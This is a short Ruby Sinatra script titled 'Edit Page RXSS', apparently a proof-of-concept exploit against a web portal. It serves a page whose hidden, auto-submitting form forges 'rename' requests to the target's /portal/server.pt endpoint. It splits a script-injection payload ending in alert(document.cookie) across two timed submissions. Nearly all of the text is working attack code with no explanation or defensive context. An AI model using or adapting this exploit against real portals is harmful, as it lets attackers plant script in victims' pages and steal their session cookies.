# Edit Page RXSS

require 'sinatra'

TARGET="http://"
PAYLOAD1="""<script>a={b:"""
PAYLOAD2="""};alert(document.cookie)<\\/script>%0a"""

get '/' do
    ## Return a form for renaming a user's default page
    ## with an XSS payload.
    """
<html>
<body>
	<iframe name='shoothere' style='display:none;'></iframe>
	<form id='go' action='#{TARGET}/portal/server.pt' method='POST' target='shoothere'>
		<input type='hidden' name='in_hi_space' value='Ajax' />
		<input type='hidden' name='in_hi_control' value='AjaxControl' />
		<input type='hidden' name='action' value='rename' />
		<input type='hidden' name='cid' value='518' />
		<input type='hidden' name='oid' value='201' />
		<input type='hidden' id='payload' name='name' value='' />
	</form>
	<script type='text/javascript'>
        document.getElementById('payload').value = \"#{PAYLOAD1}\";
		document.getElementById('go').submit();
        setTimeout(function() {
            document.getElementById('payload').value = \"#{PAYLOAD2}\";
		    document.getElementById('go').submit();
        }, 1000);
	</script>
</body>
</html>
    """
end
